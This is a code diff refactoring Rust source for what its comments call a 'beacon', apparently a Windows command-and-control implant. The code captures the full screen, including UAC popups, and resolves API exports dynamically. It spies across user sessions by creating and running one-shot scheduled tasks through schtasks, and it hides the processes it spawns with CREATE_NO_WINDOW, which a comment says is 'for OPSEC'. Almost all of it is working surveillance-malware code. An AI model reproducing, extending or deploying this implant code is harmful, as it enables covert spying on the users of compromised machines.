@@ -661,178 +661,9 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     // hits exactly these handles — no process-wide static state.
     let winsta_guard = unsafe { attach_interactive() };
 
-    // Wrap in a closure so detach_interactive() runs on EVERY return path
+    // Capture in a helper so detach_interactive() runs on EVERY return path
     // (including the `?` early-returns from export_addr resolution).
-    let result = (|| -> Option<(Vec<u8>, bool)> {
-        type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
-        type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-        type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
-        type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-        // CreateDIBSection signature:
-        //   HDC hdc, CONST BITMAPINFO *pbmi, UINT usage,
-        //   VOID **ppvBits, HANDLE hSection, DWORD offset
-        // `usage` = DIB_RGB_COLORS (0). `hSection`/`offset` = NULL/0 (page-file
-        // backed — the common case; we don't need a shared memory section).
-        // Returns HBITMAP (NULL on failure) AND sets *ppvBits to the mapped
-        // pixel buffer (NULL on failure). The returned HBITMAP owns the
-        // mapping — DeleteObject releases it.
-        type CreateDibSection = unsafe extern "system" fn(
-            *mut c_void,
-            *const BitmapInfoHeader,
-            u32,
-            *mut *mut c_void,
-            *mut c_void,
-            u32,
-        ) -> *mut c_void;
-        type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-        type BitBlt = unsafe extern "system" fn(
-            *mut c_void,
-            i32,
-            i32,
-            i32,
-            i32,
-            *mut c_void,
-            i32,
-            i32,
-            u32,
-        ) -> i32;
-        type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
-        type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
-
-        let gsm: GetSystemMetrics =
-            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
-        let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
-        let rdc: ReleaseDc =
-            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
-        let ccdc: CreateCompatibleDc =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
-        let cds: CreateDibSection =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateDIBSection")?) };
-        let so: SelectObject =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
-        let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
-        let do_: DeleteObject =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
-        let ddc: DeleteDc =
-            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
-
-        let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
-        let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
-        let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
-        let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
-        if w <= 0 || h <= 0 {
-            return None;
-        }
-        let (w, h) = (w as usize, h as usize);
-        let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
-        let bytes = pc.checked_mul(4)?;
-
-        // BITMAPINFOHEADER used as BOTH the CreateDIBSection input descriptor
-        // AND the in-file info header. biHeight POSITIVE → bottom-up DIB, which
-        // is exactly BMP's row order, so no flip is needed on the way to the
-        // file body. biCompression = 0 (BI_RGB) — no color table follows.
-        let bi = BitmapInfoHeader {
-            bi_size: 40,
-            bi_width: w as i32,
-            bi_height: h as i32,
-            bi_planes: 1,
-            bi_bit_count: 32,
-            bi_compression: 0,
-            bi_size_image: (w as u32) * (h as u32) * 4,
-            bi_x_pels_per_meter: 0,
-            bi_y_pels_per_meter: 0,
-            bi_clr_used: 0,
-            bi_clr_important: 0,
-        };
-
-        // owned_pixels takes ownership of the CreateDIBSection-mapped buffer so
-        // it gets copied into a heap Vec BEFORE we DeleteObject the HBITMAP
-        // (which unmaps the DIB section). The copy is mandatory — the mapped
-        // memory is freed by DeleteObject, so we can't return a slice into it.
-        // None means the GDI sequence failed at some step; the cleanup paths
-        // inside the unsafe block already released every handle in that case.
-        let owned_pixels: Option<Vec<u8>> = unsafe {
-            let sdc = gdc(core::ptr::null_mut());
-            if sdc.is_null() {
-                return None;
-            }
-            let mdc = ccdc(sdc);
-            if mdc.is_null() {
-                rdc(core::ptr::null_mut(), sdc);
-                return None;
-            }
-            let mut ppv_bits: *mut c_void = core::ptr::null_mut();
-            // CreateDIBSection allocates the DIB at EXACTLY bi_width × bi_height
-            // (× 4 bytes/pixel at 32 bpp), regardless of the DC's DPI awareness
-            // state. This is the fix for the size bug — see the function doc.
-            let bmp = cds(
-                sdc,
-                &bi,
-                DIB_RGB_COLORS,
-                &mut ppv_bits,
-                core::ptr::null_mut(),
-                0,
-            );
-            if bmp.is_null() || ppv_bits.is_null() {
-                ddc(mdc);
-                rdc(core::ptr::null_mut(), sdc);
-                return None;
-            }
-            let prev = so(mdc, bmp);
-            if bb(
-                mdc,
-                0,
-                0,
-                w as i32,
-                h as i32,
-                sdc,
-                vsx,
-                vsy,
-                SRCCOPY | CAPTUREBLT,
-            ) == 0
-            {
-                so(mdc, prev);
-                do_(bmp);
-                ddc(mdc);
-                rdc(core::ptr::null_mut(), sdc);
-                return None;
-            }
-            // BitBlt has now filled the DIB section's pixel buffer through the
-            // memory DC. Copy bytes out of the mapped surface into a heap Vec
-            // BEFORE DeleteObject — once we release the HBITMAP the mapping is
-            // gone and ppv_bits dangles. We must NOT wrap ppv_bits in a Vec
-            // (Vec's destructor would call our allocator on memory Windows
-            // owns); a plain memcpy into a fresh heap allocation is correct.
-            let mut pixels: Vec<u8> = vec![0u8; bytes];
-            core::ptr::copy_nonoverlapping(ppv_bits as *const u8, pixels.as_mut_ptr(), bytes);
-            so(mdc, prev);
-            do_(bmp);
-            ddc(mdc);
-            rdc(core::ptr::null_mut(), sdc);
-            Some(pixels)
-        };
-        let pixels = owned_pixels?;
-
-        let fs = 14 + 40 + pixels.len();
-        let mut b: Vec<u8> = Vec::with_capacity(fs);
-        b.extend_from_slice(b"BM");
-        b.extend_from_slice(&(fs as u32).to_le_bytes());
-        b.extend_from_slice(&0u32.to_le_bytes());
-        b.extend_from_slice(&54u32.to_le_bytes());
-        b.extend_from_slice(&40u32.to_le_bytes());
-        b.extend_from_slice(&(w as i32).to_le_bytes());
-        b.extend_from_slice(&(h as i32).to_le_bytes());
-        b.extend_from_slice(&1u16.to_le_bytes());
-        b.extend_from_slice(&32u16.to_le_bytes());
-        b.extend_from_slice(&0u32.to_le_bytes());
-        b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
-        b.extend_from_slice(&0i32.to_le_bytes());
-        b.extend_from_slice(&0i32.to_le_bytes());
-        b.extend_from_slice(&0u32.to_le_bytes());
-        b.extend_from_slice(&0u32.to_le_bytes());
-        b.extend_from_slice(&pixels);
-        Some((b, dpi_aware))
-    })();
+    let result = capture_bmp_gdi(dpi_aware);
 
     // Restore the original window station + close our WinSta0 handle on every
     // exit path (success, screen-size check failure, GDI failure, etc.).
@@ -848,6 +679,292 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         unsafe { restore_thread_dpi(o) };
     }
     result
+}
+
+/// The GDI capture pipeline proper (everything between attach and detach):
+/// resolve exports, measure the virtual screen, BitBlt the DIB, and assemble
+/// the BMP. `dpi_aware` is threaded in so the caller's filename flag survives.
+fn capture_bmp_gdi(dpi_aware: bool) -> Option<(Vec<u8>, bool)> {
+    let (gsm, gdc, rdc, ccdc, cds, so, bb, do_, ddc) = capture_bmp_resolve()?;
+    let (w, h, bytes, bi, vsx, vsy) = capture_bmp_geometry(gsm)?;
+    let pixels = capture_bmp_pixels(
+        gdc, rdc, ccdc, cds, so, bb, do_, ddc, &bi, w, h, vsx, vsy, bytes,
+    )?;
+    Some((capture_bmp_assemble(pixels, w, h), dpi_aware))
+}
+
+/// Resolve the 9 user32/gdi32 exports used by the capture, in the order the
+/// original closure did, as raw addresses (each stage helper transmutes the
+/// ones it calls). `None` if any is missing — the caller unwinds with the
+/// station/desktop already detached.
+fn capture_bmp_resolve(
+) -> Option<(usize, usize, usize, usize, usize, usize, usize, usize, usize)> {
+    let gsm = match unsafe { export_addr(b"user32.dll", b"GetSystemMetrics") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let gdc = match unsafe { export_addr(b"user32.dll", b"GetDC") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let rdc = match unsafe { export_addr(b"user32.dll", b"ReleaseDC") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let ccdc = match unsafe { export_addr(b"gdi32.dll", b"CreateCompatibleDC") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let cds = match unsafe { export_addr(b"gdi32.dll", b"CreateDIBSection") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let so = match unsafe { export_addr(b"gdi32.dll", b"SelectObject") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let bb = match unsafe { export_addr(b"gdi32.dll", b"BitBlt") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let do_ = match unsafe { export_addr(b"gdi32.dll", b"DeleteObject") } {
+        Some(a) => a,
+        None => return None,
+    };
+    let ddc = match unsafe { export_addr(b"gdi32.dll", b"DeleteDC") } {
+        Some(a) => a,
+        None => return None,
+    };
+    Some((gsm, gdc, rdc, ccdc, cds, so, bb, do_, ddc))
+}
+
+/// Measure the virtual screen and build the `BITMAPINFOHEADER` used as BOTH
+/// the CreateDIBSection input descriptor AND the in-file info header.
+/// `biHeight` POSITIVE → bottom-up DIB, which is exactly BMP's row order, so
+/// no flip is needed on the way to the file body. `biCompression` = 0
+/// (BI_RGB) — no color table follows. Returns None when the screen is empty
+/// or pathologically large (see `MAX_PIXELS`).
+fn capture_bmp_geometry(gsm: usize) -> Option<(usize, usize, usize, BitmapInfoHeader, i32, i32)> {
+    type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
+    let gsm: GetSystemMetrics = unsafe { core::mem::transmute(gsm) };
+    let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
+    let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
+    let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
+    let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
+    if w <= 0 || h <= 0 {
+        return None;
+    }
+    let (w, h) = (w as usize, h as usize);
+    let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
+    let bytes = pc.checked_mul(4)?;
+    let bi = BitmapInfoHeader {
+        bi_size: 40,
+        bi_width: w as i32,
+        bi_height: h as i32,
+        bi_planes: 1,
+        bi_bit_count: 32,
+        bi_compression: 0,
+        bi_size_image: (w as u32) * (h as u32) * 4,
+        bi_x_pels_per_meter: 0,
+        bi_y_pels_per_meter: 0,
+        bi_clr_used: 0,
+        bi_clr_important: 0,
+    };
+    Some((w, h, bytes, bi, vsx, vsy))
+}
+
+/// The GDI handle sequence: screen DC → memory DC → DIB section → BitBlt →
+/// memcpy into a heap Vec, releasing every handle on ALL paths (success,
+/// partial failure, and resolution failure — see the module doc on GDI handle
+/// hygiene). `owned_pixels`-equivalent ownership: the mapped DIB buffer is
+/// copied into a heap Vec BEFORE `DeleteObject` unmaps it.
+fn capture_bmp_pixels(
+    gdc: usize,
+    rdc: usize,
+    ccdc: usize,
+    cds: usize,
+    so: usize,
+    bb: usize,
+    do_: usize,
+    ddc: usize,
+    bi: &BitmapInfoHeader,
+    w: usize,
+    h: usize,
+    vsx: i32,
+    vsy: i32,
+    bytes: usize,
+) -> Option<Vec<u8>> {
+    let (sdc, mdc) = capture_bmp_dcs(gdc, rdc, ccdc)?;
+    let (bmp, ppv_bits) = capture_bmp_dib(cds, ddc, rdc, sdc, mdc, bi)?;
+    let (prev, ppv_bits) = capture_bmp_blt(so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy)?;
+    capture_bmp_copy(so, do_, ddc, rdc, sdc, mdc, bmp, prev, ppv_bits, bytes)
+}
+
+/// Acquire the screen DC (`GetDC(NULL)`) and a compatible memory DC. On any
+/// failure the handles acquired so far are released before returning `None`.
+fn capture_bmp_dcs(gdc: usize, rdc: usize, ccdc: usize) -> Option<(*mut c_void, *mut c_void)> {
+    type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+    type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+    let gdc: GetDc = unsafe { core::mem::transmute(gdc) };
+    let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
+    let ccdc: CreateCompatibleDc = unsafe { core::mem::transmute(ccdc) };
+    let sdc = unsafe { gdc(core::ptr::null_mut()) };
+    if sdc.is_null() {
+        return None;
+    }
+    let mdc = unsafe { ccdc(sdc) };
+    if mdc.is_null() {
+        unsafe { rdc(core::ptr::null_mut(), sdc) };
+        return None;
+    }
+    Some((sdc, mdc))
+}
+
+/// Create the DIB section. Returns the HBITMAP and the mapped pixel pointer
+/// (`*ppvBits`); on failure the DCs are released before returning `None`.
+fn capture_bmp_dib(
+    cds: usize,
+    ddc: usize,
+    rdc: usize,
+    sdc: *mut c_void,
+    mdc: *mut c_void,
+    bi: &BitmapInfoHeader,
+) -> Option<(*mut c_void, *mut c_void)> {
+    // CreateDIBSection signature:
+    //   HDC hdc, CONST BITMAPINFO *pbmi, UINT usage,
+    //   VOID **ppvBits, HANDLE hSection, DWORD offset
+    // `usage` = DIB_RGB_COLORS (0). `hSection`/`offset` = NULL/0 (page-file
+    // backed — the common case; we don't need a shared memory section).
+    // Returns HBITMAP (NULL on failure) AND sets *ppvBits to the mapped
+    // pixel buffer (NULL on failure). The returned HBITMAP owns the
+    // mapping — DeleteObject releases it.
+    type CreateDibSection = unsafe extern "system" fn(
+        *mut c_void,
+        *const BitmapInfoHeader,
+        u32,
+        *mut *mut c_void,
+        *mut c_void,
+        u32,
+    ) -> *mut c_void;
+    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
+    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+    let cds: CreateDibSection = unsafe { core::mem::transmute(cds) };
+    let ddc: DeleteObject = unsafe { core::mem::transmute(ddc) };
+    let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
+    let mut ppv_bits: *mut c_void = core::ptr::null_mut();
+    // CreateDIBSection allocates the DIB at EXACTLY bi_width × bi_height
+    // (× 4 bytes/pixel at 32 bpp), regardless of the DC's DPI awareness
+    // state. This is the fix for the size bug — see the function doc.
+    let bmp = unsafe { cds(sdc, bi, DIB_RGB_COLORS, &mut ppv_bits, core::ptr::null_mut(), 0) };
+    if bmp.is_null() || ppv_bits.is_null() {
+        unsafe { ddc(mdc) };
+        unsafe { rdc(core::ptr::null_mut(), sdc) };
+        return None;
+    }
+    Some((bmp, ppv_bits))
+}
+
+/// Select the DIB into the memory DC and `BitBlt(SRCCOPY | CAPTUREBLT)` the
+/// virtual screen into it (captures layered windows, UAC popups and overlay
+/// surfaces that plain SRCCOPY would skip). Returns `(previous object, mapped
+/// pixel pointer)`; on failure every handle is released before `None`.
+fn capture_bmp_blt(
+    so: usize,
+    bb: usize,
+    do_: usize,
+    ddc: usize,
+    rdc: usize,
+    mdc: *mut c_void,
+    sdc: *mut c_void,
+    bmp: *mut c_void,
+    ppv_bits: *mut c_void,
+    w: usize,
+    h: usize,
+    vsx: i32,
+    vsy: i32,
+) -> Option<(*mut c_void, *mut c_void)> {
+    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
+    type BitBlt = unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32, *mut c_void, i32, i32, u32) -> i32;
+    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
+    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
+    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+    let so: SelectObject = unsafe { core::mem::transmute(so) };
+    let bb: BitBlt = unsafe { core::mem::transmute(bb) };
+    let do_: DeleteObject = unsafe { core::mem::transmute(do_) };
+    let ddc: DeleteDc = unsafe { core::mem::transmute(ddc) };
+    let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
+    let prev = unsafe { so(mdc, bmp) };
+    if unsafe { bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) } == 0 {
+        unsafe { so(mdc, prev) };
+        unsafe { do_(bmp) };
+        unsafe { ddc(mdc) };
+        unsafe { rdc(core::ptr::null_mut(), sdc) };
+        return None;
+    }
+    Some((prev, ppv_bits))
+}
+
+/// Copy the DIB's mapped pixel buffer into a heap Vec, then release every GDI
+/// handle (restore previous object → delete bitmap → delete memory DC →
+/// release screen DC). The copy is mandatory — the mapped memory is freed by
+/// DeleteObject, so a slice into `ppv_bits` would dangle. We must NOT wrap
+/// `ppv_bits` in a Vec (Vec's destructor would call our allocator on memory
+/// Windows owns); a plain memcpy into a fresh heap allocation is correct.
+fn capture_bmp_copy(
+    so: usize,
+    do_: usize,
+    ddc: usize,
+    rdc: usize,
+    sdc: *mut c_void,
+    mdc: *mut c_void,
+    bmp: *mut c_void,
+    prev: *mut c_void,
+    ppv_bits: *mut c_void,
+    bytes: usize,
+) -> Option<Vec<u8>> {
+    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
+    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
+    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
+    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+    let so: SelectObject = unsafe { core::mem::transmute(so) };
+    let do_: DeleteObject = unsafe { core::mem::transmute(do_) };
+    let ddc: DeleteDc = unsafe { core::mem::transmute(ddc) };
+    let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
+    let mut pixels: Vec<u8> = vec![0u8; bytes];
+    unsafe {
+        core::ptr::copy_nonoverlapping(ppv_bits as *const u8, pixels.as_mut_ptr(), bytes);
+        so(mdc, prev);
+        do_(bmp);
+        ddc(mdc);
+        rdc(core::ptr::null_mut(), sdc);
+    }
+    Some(pixels)
+}
+
+/// Assemble the 14-byte file header + 40-byte info header + bottom-up BGRA
+/// pixels into a complete BMP byte buffer (BMP stores the BITMAPINFOHEADER
+/// verbatim, so the same struct used for CreateDIBSection is emitted here).
+fn capture_bmp_assemble(pixels: Vec<u8>, w: usize, h: usize) -> Vec<u8> {
+    let fs = 14 + 40 + pixels.len();
+    let mut b: Vec<u8> = Vec::with_capacity(fs);
+    b.extend_from_slice(b"BM");
+    b.extend_from_slice(&(fs as u32).to_le_bytes());
+    b.extend_from_slice(&0u32.to_le_bytes());
+    b.extend_from_slice(&54u32.to_le_bytes());
+    b.extend_from_slice(&40u32.to_le_bytes());
+    b.extend_from_slice(&(w as i32).to_le_bytes());
+    b.extend_from_slice(&(h as i32).to_le_bytes());
+    b.extend_from_slice(&1u16.to_le_bytes());
+    b.extend_from_slice(&32u16.to_le_bytes());
+    b.extend_from_slice(&0u32.to_le_bytes());
+    b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
+    b.extend_from_slice(&0i32.to_le_bytes());
+    b.extend_from_slice(&0i32.to_le_bytes());
+    b.extend_from_slice(&0u32.to_le_bytes());
+    b.extend_from_slice(&0u32.to_le_bytes());
+    b.extend_from_slice(&pixels);
+    b
 }
 
 /// Create `path` (ASCII, NUL-terminated) and write `data` to it, advancing by
@@ -1243,12 +1360,27 @@ unsafe fn run_screenshot_task(
     cmd_extend_wide(&mut helper_cmd, dpath);
     for &by in b",nyx_screenshot_session" { helper_cmd.push(by as u16); }
 
+    // Create + trigger the one-shot task, then poll for the BMP result.
+    if !unsafe { run_screenshot_task_schedule(&task_name, &helper_cmd, runas) } {
+        return None;
+    }
+    unsafe { run_screenshot_task_poll(&task_name) }
+}
+
+/// Build and run the `schtasks /create` and `schtasks /run` commands for the
+/// one-shot task. On any failure sets `XSESS_FAIL = 5`, deletes the task and
+/// returns false (the caller bails out of [`run_screenshot_task`]).
+unsafe fn run_screenshot_task_schedule(
+    task_name: &[u16],
+    helper_cmd: &[u16],
+    runas: &[u16],
+) -> bool {
     // Build schtasks /create command.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
     for &by in b"schtasks /create /tn " { create_cmd.push(by as u16); }
-    create_cmd.extend_from_slice(&task_name);
+    create_cmd.extend_from_slice(task_name);
     for &by in b" /tr \"" { create_cmd.push(by as u16); }
-    create_cmd.extend_from_slice(&helper_cmd);
+    create_cmd.extend_from_slice(helper_cmd);
     for &by in b"\" /sc once /st 23:59 /it" { create_cmd.push(by as u16); }
     if !runas.is_empty() {
         for &by in b" /ru \"" { create_cmd.push(by as u16); }
@@ -1258,22 +1390,27 @@ unsafe fn run_screenshot_task(
     for &by in b" /f\0" { create_cmd.push(by as u16); }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
         unsafe { XSESS_FAIL = 5; }
-        let _ = unsafe { delete_task(&task_name) };
-        return None;
+        let _ = unsafe { delete_task(task_name) };
+        return false;
     }
 
     // Trigger the task.
     let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
     for &by in b"schtasks /run /tn " { run_cmd.push(by as u16); }
-    run_cmd.extend_from_slice(&task_name);
+    run_cmd.extend_from_slice(task_name);
     run_cmd.push(0);
     if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
         unsafe { XSESS_FAIL = 5; }
-        let _ = unsafe { delete_task(&task_name) };
-        return None;
+        let _ = unsafe { delete_task(task_name) };
+        return false;
     }
+    true
+}
 
-    // Poll for BMP (up to ~15s, 250ms × 60).
+/// Poll for the BMP written by the scheduled helper (up to ~15s, 250ms × 60),
+/// then delete the one-shot task. On timeout the stale temp BMP is removed
+/// and `XSESS_FAIL = 7` is set.
+unsafe fn run_screenshot_task_poll(task_name: &[u16]) -> Option<Vec<u8>> {
     let sleep_fn: unsafe extern "system" fn(u32) =
         unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"Sleep")?) };
     let mut bmp: Option<Vec<u8>> = None;
@@ -1284,7 +1421,7 @@ unsafe fn run_screenshot_task(
             break;
         }
     }
-    let _ = unsafe { delete_task(&task_name) };
+    let _ = unsafe { delete_task(task_name) };
     match bmp {
         Some(b) => Some(b),
         None => {
@@ -1321,67 +1458,72 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     run_screenshot_task(&runas, &dpath)
 }
 
+// ---- run_cmd_wait Win32 types ----
+// Hoisted from the old run_cmd_wait body to module scope so the extracted
+// spawn stage helper can share them.
+
+/// STARTUPINFO layout for the schtasks helper process (fields beyond `cb` are
+/// left zeroed; no handle redirection — stdout/stderr are discarded).
+#[repr(C)]
+struct StartupInfoRun {
+    cb: u32,
+    lp_reserved: *const u16,
+    lp_desktop: *const u16,
+    lp_title: *const u16,
+    dw_x: u32,
+    dw_y: u32,
+    dw_x_size: u32,
+    dw_y_size: u32,
+    dw_x_count_chars: u32,
+    dw_y_count_chars: u32,
+    dw_fill_attribute: u32,
+    dw_flags: u32,
+    w_show_window: u16,
+    cb_reserved2: u16,
+    lp_reserved2: *mut u8,
+    h_std_input: *mut c_void,
+    h_std_output: *mut c_void,
+    h_std_error: *mut c_void,
+}
+
+/// PROCESS_INFORMATION layout for the schtasks helper process.
+#[repr(C)]
+struct ProcessInfoRun {
+    h_process: *mut c_void,
+    h_thread: *mut c_void,
+    dw_pid: u32,
+    dw_tid: u32,
+}
+
 /// Run a NUL-terminated UTF-16 command line via `cmd.exe /C` in the current
 /// session, waiting up to 30s for it to finish. Returns true if cmd exited 0.
 /// Used by cross_session_capture to drive the schtasks create/run/delete
 /// commands — all same-session (the beacon's own token), no token juggling.
 /// Stdout/stderr are discarded (CREATE_NO_WINDOW + no pipe) for OPSEC.
 unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
-    type CreateProcessW = unsafe extern "system" fn(
-        *const u16,
-        *mut u16,
-        *const c_void,
-        *const c_void,
-        i32,
-        u32,
-        *const c_void,
-        *const u16,
-        *mut StartupInfoRun,
-        *mut ProcessInfoRun,
-    ) -> i32;
-    #[repr(C)]
-    struct StartupInfoRun {
-        cb: u32,
-        lp_reserved: *const u16,
-        lp_desktop: *const u16,
-        lp_title: *const u16,
-        dw_x: u32,
-        dw_y: u32,
-        dw_x_size: u32,
-        dw_y_size: u32,
-        dw_x_count_chars: u32,
-        dw_y_count_chars: u32,
-        dw_fill_attribute: u32,
-        dw_flags: u32,
-        w_show_window: u16,
-        cb_reserved2: u16,
-        lp_reserved2: *mut u8,
-        h_std_input: *mut c_void,
-        h_std_output: *mut c_void,
-        h_std_error: *mut c_void,
-    }
-    #[repr(C)]
-    struct ProcessInfoRun {
-        h_process: *mut c_void,
-        h_thread: *mut c_void,
-        dw_pid: u32,
-        dw_tid: u32,
-    }
-    let cpw: CreateProcessW = match unsafe { export_addr(b"kernel32.dll", b"CreateProcessW") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
+    let cpw = match unsafe { export_addr(b"kernel32.dll", b"CreateProcessW") } {
+        Some(a) => a,
         None => return false,
     };
-    let wso: unsafe extern "system" fn(*mut c_void, u32) -> u32 =
-        match unsafe { export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
-        };
-    let gec: unsafe extern "system" fn(*mut c_void, *mut u32) -> i32 =
-        match unsafe { export_addr(b"kernel32.dll", b"GetExitCodeProcess") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
-        };
+    let wso = match unsafe { export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
+        Some(a) => a,
+        None => return false,
+    };
+    let gec = match unsafe { export_addr(b"kernel32.dll", b"GetExitCodeProcess") } {
+        Some(a) => a,
+        None => return false,
+    };
+    let mut full = run_cmd_wait_build(cmdline);
+    run_cmd_wait_spawn(cpw, wso, gec, full.as_mut_ptr())
+}
 
+/// Prepend `cmd.exe /C ` to `cmdline` (up to its NUL) in one writable buffer —
+/// CreateProcessW may modify lpCommandLine in place, so redirection/multi-arg
+/// parsing is handled by cmd.
+///
+/// # Safety
+/// Dereferences `cmdline` as a NUL-terminated UTF-16 buffer.
+unsafe fn run_cmd_wait_build(cmdline: *mut u16) -> crate::heap::Vec<u16> {
     // Prepend "cmd.exe /C " to the command so redirection/multi-arg parsing is
     // handled by cmd. Build in one writable buffer (CreateProcessW may mutate
     // lpCommandLine in place).
@@ -1398,7 +1540,34 @@ unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
         }
     }
     full.push(0);
+    full
+}
 
+/// Spawn the helper process and reap it: CreateProcessW (CREATE_NO_WINDOW, no
+/// handle inheritance) → WaitForSingleObject(30s) → GetExitCodeProcess →
+/// close both process handles. Returns `WAIT_OBJECT_0 && exit 0`.
+///
+/// # Safety
+/// Transmutes the resolved export addresses and drives the raw process
+/// handles.
+unsafe fn run_cmd_wait_spawn(cpw: usize, wso: usize, gec: usize, full: *mut u16) -> bool {
+    type CreateProcessW = unsafe extern "system" fn(
+        *const u16,
+        *mut u16,
+        *const c_void,
+        *const c_void,
+        i32,
+        u32,
+        *const c_void,
+        *const u16,
+        *mut StartupInfoRun,
+        *mut ProcessInfoRun,
+    ) -> i32;
+    type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
+    type GetExitCodeProcess = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
+    let cpw: CreateProcessW = unsafe { core::mem::transmute(cpw) };
+    let wso: WaitForSingleObject = unsafe { core::mem::transmute(wso) };
+    let gec: GetExitCodeProcess = unsafe { core::mem::transmute(gec) };
     let mut si: StartupInfoRun = unsafe { core::mem::zeroed() };
     si.cb = core::mem::size_of::<StartupInfoRun>() as u32;
     let mut pi: ProcessInfoRun = unsafe { core::mem::zeroed() };
@@ -1406,7 +1575,7 @@ unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
     let ok = unsafe {
         cpw(
             core::ptr::null(),
-            full.as_mut_ptr(),
+            full,
             core::ptr::null(),
             core::ptr::null(),
             0,
